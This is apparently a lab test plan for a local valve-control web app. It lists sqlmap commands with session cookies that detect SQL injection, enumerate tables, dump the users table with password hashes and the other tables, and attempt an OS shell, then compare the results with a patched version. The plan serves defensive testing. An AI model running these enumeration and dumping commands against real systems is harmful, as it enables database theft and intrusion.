# SQLMap Testing Commands - Step by Step

## Cookie Values (from cookies.txt)
```
OPERATOR_SESSION=.eJyrVsosiE9MSSlKLS5WslIyNDHTMzfVMzXRMzQ2UtJRKsrPSQUK5xekFiWW5BcBRUqLU4viM1OUrIwg7LzEXBQVtQAH5xn2.aWE4Rg.tz02VbHh2R5QQoK3GjIl-WUyW0Y
ADMIN_SESSION=.eJyrVsosiE9MSSlKLS5WslIyNDHTMzfVMzXRMzQ2UtJRKsrPSQUKJ6bkZuYBuaXFqUXxmSlKVoYQdl5iLkK6FgBjkxcv.aWE5Vg.kbBQoiCQ_jbaARJLhbEI7KyYdvA
PATCHED_ADMIN_SESSION=.eJyrVsosiE9MSSlKLS5WslIyNDHTMzfVMzXRMzQ2UtJRKsrPSQUKJ6bkZuYBuaXFqUXxmSlKVoYQdl5iLkK6FgBjkxcv.aWE6eQ.OIgzcH5cns4zSqrU599rQNWYIYU
```

---

## Part B: Test Operator (Should Be Safe) - COMPLETED ✓

### Command 1: Operator Initial Test
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=.eJyrVsosiE9MSSlKLS5WslIyNDHTMzfVMzXRMzQ2UtJRKsrPSQUK5xekFiWW5BcBRUqLU4viM1OUrIwg7LzEXBQVtQAH5xn2.aWE4Rg.tz02VbHh2R5QQoK3GjIl-WUyW0Y" \
  --batch \
  --level=3 \
  --risk=2 \
  > testing_results/sqlmap_outputs/01_operator_test.txt 2>&1
```
**Screenshot:** 29_sqlmap_operator_safe.png

---

## Part C: Test Admin (Should Find Vulnerability)

### Command 2: Admin Initial Detection
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=.eJyrVsosiE9MSSlKLS5WslIyNDHTMzfVMzXRMzQ2UtJRKsrPSQUKJ6bkZuYBuaXFqUXxmSlKVoYQdl5iLkK6FgBjkxcv.aWE5Vg.kbBQoiCQ_jbaARJLhbEI7KyYdvA" \
  --batch \
  --level=3 \
  --risk=2 \
  > testing_results/sqlmap_outputs/02_admin_detection.txt 2>&1
```
**Screenshot:** 30_sqlmap_admin_vulnerable.png

### Command 3: Enumerate Databases
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=.eJyrVsosiE9MSSlKLS5WslIyNDHTMzfVMzXRMzQ2UtJRKsrPSQUKJ6bkZuYBuaXFqUXxmSlKVoYQdl5iLkK6FgBjkxcv.aWE5Vg.kbBQoiCQ_jbaARJLhbEI7KyYdvA" \
  --batch \
  --dbs \
  > testing_results/sqlmap_outputs/03_databases.txt 2>&1
```
**Screenshot:** 31_sqlmap_databases.png

### Command 4: Enumerate Tables
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=.eJyrVsosiE9MSSlKLS5WslIyNDHTMzfVMzXRMzQ2UtJRKsrPSQUKJ6bkZuYBuaXFqUXxmSlKVoYQdl5iLkK6FgBjkxcv.aWE5Vg.kbBQoiCQ_jbaARJLhbEI7KyYdvA" \
  --batch \
  -D valves \
  --tables \
  > testing_results/sqlmap_outputs/04_tables.txt 2>&1
```
**Screenshot:** 32_sqlmap_tables.png

### Command 5: Enumerate User Columns
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=.eJyrVsosiE9MSSlKLS5WslIyNDHTMzfVMzXRMzQ2UtJRKsrPSQUKJ6bkZuYBuaXFqUXxmSlKVoYQdl5iLkK6FgBjkxcv.aWE5Vg.kbBQoiCQ_jbaARJLhbEI7KyYdvA" \
  --batch \
  -D valves \
  -T users \
  --columns \
  > testing_results/sqlmap_outputs/05_user_columns.txt 2>&1
```
**Screenshot:** 33_sqlmap_columns.png

### Command 6: Dump Users Table
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=.eJyrVsosiE9MSSlKLS5WslIyNDHTMzfVMzXRMzQ2UtJRKsrPSQUKJ6bkZuYBuaXFqUXxmSlKVoYQdl5iLkK6FgBjkxcv.aWE5Vg.kbBQoiCQ_jbaARJLhbEI7KyYdvA" \
  --batch \
  -D valves \
  -T users \
  --dump \
  > testing_results/sqlmap_outputs/06_users_dump.txt 2>&1
```
**Screenshot:** 34_sqlmap_users_dump.png

### Command 7: Dump Valves Table
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=.eJyrVsosiE9MSSlKLS5WslIyNDHTMzfVMzXRMzQ2UtJRKsrPSQUKJ6bkZuYBuaXFqUXxmSlKVoYQdl5iLkK6FgBjkxcv.aWE5Vg.kbBQoiCQ_jbaARJLhbEI7KyYdvA" \
  --batch \
  -D valves \
  -T valves \
  --dump \
  --threads 5 \
  > testing_results/sqlmap_outputs/07_valves_dump.txt 2>&1
```

### Command 8: Dump Command Logs
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=.eJyrVsosiE9MSSlKLS5WslIyNDHTMzfVMzXRMzQ2UtJRKsrPSQUKJ6bkZuYBuaXFqUXxmSlKVoYQdl5iLkK6FgBjkxcv.aWE5Vg.kbBQoiCQ_jbaARJLhbEI7KyYdvA" \
  --batch \
  -D valves \
  -T command_logs \
  --dump \
  > testing_results/sqlmap_outputs/08_logs_dump.txt 2>&1
```
**Screenshot:** 35_sqlmap_full_dump.png

### Command 9: Copy CSV Dump
```bash
find ~/.local/share/sqlmap -name "users.csv" -exec cp {} testing_results/sqlmap_outputs/users_dumped.csv \; 2>/dev/null || find ~/.sqlmap -name "users.csv" -exec cp {} testing_results/sqlmap_outputs/users_dumped.csv \; 2>/dev/null
```

---

## Part D: Test Patched Version (Should Be Safe)

### Command 10: Patched Admin Test
```bash
sqlmap -u "http://localhost:5001/valves/search" \
  --data "search=test" \
  --cookie "session=.eJyrVsosiE9MSSlKLS5WslIyNDHTMzfVMzXRMzQ2UtJRKsrPSQUKJ6bkZuYBuaXFqUXxmSlKVoYQdl5iLkK6FgBjkxcv.aWE6eQ.OIgzcH5cns4zSqrU599rQNWYIYU" \
  --batch \
  --level=5 \
  --risk=3 \
  > testing_results/sqlmap_outputs/09_patched_test.txt 2>&1
```
**Screenshot:** 36_sqlmap_patched_safe.png

---

## Part E: Advanced Features

### Command 11: OS Shell Attempt
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=.eJyrVsosiE9MSSlKLS5WslIyNDHTMzfVMzXRMzQ2UtJRKsrPSQUKJ6bkZuYBuaXFqUXxmSlKVoYQdl5iLkK6FgBjkxcv.aWE5Vg.kbBQoiCQ_jbaARJLhbEI7KyYdvA" \
  --batch \
  --os-shell \
  > testing_results/sqlmap_outputs/10_os_shell_attempt.txt 2>&1
```

---

## Expected Results Summary

- **Command 1 (Operator):** Should show "not injectable" - SAFE ✓
- **Command 2 (Admin):** Should find SQL injection vulnerability
- **Command 3:** Should show database "valves"
- **Command 4:** Should show 5 tables (users, valves, command_logs, attack_logs, scheduled_operations)
- **Command 5:** Should show user table columns (id, username, password_hash, role, email, etc.)
- **Command 6:** Should dump all user data with password hashes
- **Command 7:** Should dump all valve configurations
- **Command 8:** Should dump command logs
- **Command 9:** Copy CSV to testing_results folder
- **Command 10 (Patched):** Should show "not injectable" - SAFE
- **Command 11:** Should fail (SQLite doesn't support OS shell)
